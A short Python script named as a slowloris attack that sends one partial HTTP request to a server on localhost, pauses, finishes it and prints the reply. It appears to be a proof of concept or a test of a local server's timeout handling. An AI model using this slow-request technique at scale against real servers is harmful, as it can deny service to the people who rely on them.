import socket
import time

def slowloris_attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8080))
    print("[+] Connected, sending partial data (no newline)...")
    s.send(b'GET / HTTP/1.1\r')
    time.sleep(12)
    print("[+] Sending rest of the data...")
    s.send(b'\nHost: localhost\r\n\r\n')
    try:
        data = s.recv(1024)
        print("[+] Received:", data.decode())
    except Exception as e:
        print("[-] Error during recv:", e)
    s.close()

if __name__ == "__main__":
    slowloris_attack()